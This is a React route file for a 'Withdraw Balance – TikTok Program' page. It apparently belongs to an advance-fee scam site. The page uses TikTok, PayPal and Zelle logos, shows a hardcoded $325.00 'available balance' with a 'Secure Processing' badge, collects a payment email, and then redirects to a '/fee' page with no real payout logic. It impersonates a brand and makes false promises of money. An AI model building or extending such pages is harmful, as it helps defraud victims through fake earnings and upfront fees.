import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { toast } from "sonner";
import paypalLogo from "@/assets/paypal.svg";
import zelleLogo from "@/assets/zelle.svg";
import tiktokLogo from "@/assets/tiktok.svg";

export const Route = createFileRoute("/withdraw")({
  head: () => ({
    title: "Withdraw Balance – TikTok Program",
    meta: [
      {
        name: "description",
        content: "Choose PayPal or Zelle to withdraw your TikTok Program balance.",
      },
      { property: "og:title", content: "Withdraw Balance – TikTok Program" },
      {
        property: "og:description",
        content: "Choose PayPal or Zelle to withdraw your TikTok Program balance.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: WithdrawPage,
});

function WithdrawPage() {
  const navigate = useNavigate();
  const [method, setMethod] = useState<"paypal" | "zelle">("paypal");
  const [emailAddress, setEmailAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const balance = "325.00";

  const handleWithdraw = (e: React.FormEvent) => {
    e.preventDefault();

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailAddress)) {
      toast.error(`Please enter a valid ${method === "paypal" ? "PayPal" : "Zelle"} email address.`);
      return;
    }

    navigate({ to: "/fee", search: { method, email: emailAddress } });
  };

  return (
    <div className="min-h-screen bg-[#f9f9f9] px-4 pt-8">
      <div className="mx-auto max-w-md">
        {/* HEADER SIMPLES */}
        <div className="mb-8 flex items-center justify-between">
          <button 
            onClick={() => navigate({ to: "/" })}
            className="text-[14px] font-semibold text-[#555555]"
          >
            ← Back
          </button>
          <div className="flex items-center gap-2">
             <img src={tiktokLogo} alt="TikTok" className="h-6 w-6" />
             <span className="text-lg font-black tracking-tighter text-[#1a1a2e]">TikTok</span>
          </div>
        </div>

        <div className="rounded-[20px] bg-white p-6 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-[#ebebeb]">
          <h1 className="text-xl font-black text-[#1a1a2e] mb-2 text-center">Withdraw Balance</h1>
          <p className="text-[14px] text-[#555555] text-center mb-6">
            Your accumulated balance is available for immediate withdrawal.
          </p>

          <div className="bg-[#f0fdf4] rounded-[14px] p-4 mb-6 border border-[#bbf7d0] text-center">
            <span className="text-[13px] font-bold text-[#15803d] block mb-1">AVAILABLE BALANCE</span>
            <span className="text-[32px] font-black text-[#15803d]">${balance}</span>
          </div>

          <form onSubmit={handleWithdraw} className="space-y-4">
            <div>
              <label className="block text-[13px] font-bold text-[#1a1a2e] mb-2 px-1">
                PAYMENT METHOD
              </label>
              <div className="space-y-3">
                <button
                  type="button"
                  onClick={() => setMethod("paypal")}
                  className={`flex items-center gap-3 w-full p-4 rounded-[14px] border-2 transition-all text-left ${method === "paypal" ? "border-[#ff4d67] bg-[#fff0f3]" : "border-[#ebebeb] bg-white hover:border-[#ffc4ce]"}`}
                >
                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-white border border-[#ebebeb] shadow-sm p-1.5">
                    <img src={paypalLogo} alt="PayPal" className="h-full w-full object-contain" />
                  </div>
                  <div className="flex flex-col">
                    <span className="text-[14px] font-bold text-[#1a1a2e]">PayPal</span>
                    <span className="text-[11px] text-[#ff4d67] font-semibold">Instant Transfer</span>
                  </div>
                  <div className="ml-auto">
                    <div className={`h-5 w-5 rounded-full border-4 bg-white ${method === "paypal" ? "border-[#ff4d67]" : "border-[#ebebeb]"}`}></div>
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => setMethod("zelle")}
                  className={`flex items-center gap-3 w-full p-4 rounded-[14px] border-2 transition-all text-left ${method === "zelle" ? "border-[#ff4d67] bg-[#fff0f3]" : "border-[#ebebeb] bg-white hover:border-[#ffc4ce]"}`}
                >
                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-white border border-[#ebebeb] shadow-sm p-1.5">
                    <img src={zelleLogo} alt="Zelle" className="h-full w-full object-contain" />
                  </div>
                  <div className="flex flex-col">
                    <span className="text-[14px] font-bold text-[#1a1a2e]">Zelle</span>
                    <span className="text-[11px] text-[#ff4d67] font-semibold">Instant Transfer</span>
                  </div>
                  <div className="ml-auto">
                    <div className={`h-5 w-5 rounded-full border-4 bg-white ${method === "zelle" ? "border-[#ff4d67]" : "border-[#ebebeb]"}`}></div>
                  </div>
                </button>
              </div>
            </div>

            <div>
              <label htmlFor="payment-email" className="block text-[13px] font-bold text-[#1a1a2e] mb-2 px-1">
                {method === "paypal" ? "PAYPAL EMAIL" : "ZELLE EMAIL"}
              </label>
              <div className="relative">
                <input
                  id="payment-email"
                  type="email"
                  placeholder="your-email@example.com"
                  value={emailAddress}
                  onChange={(e) => setEmailAddress(e.target.value.trim())}
                  className="w-full p-4 rounded-[14px] border border-[#ebebeb] bg-[#f9f9f9] text-[16px] focus:outline-none focus:ring-2 focus:ring-[#ff4d67]/20 transition-all"
                  required
                />
              </div>
            </div>


            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#ff4d67] text-white p-[18px] rounded-[14px] font-extrabold text-[17px] shadow-[0_6px_20px_rgba(255,77,103,0.35)] hover:bg-[#ff3452] active:scale-[0.98] transition-all flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-white/30 border-t-white"></div>
              ) : (
                <>WITHDRAW NOW</>
              )}
            </button>
          </form>

          <div className="mt-6 flex items-center justify-center gap-2 text-[#999999]">
             <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
               <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
             </svg>
             <span className="text-[11px] font-medium uppercase tracking-wider">Secure Processing</span>
          </div>
        </div>
      </div>

    </div>
  );
}
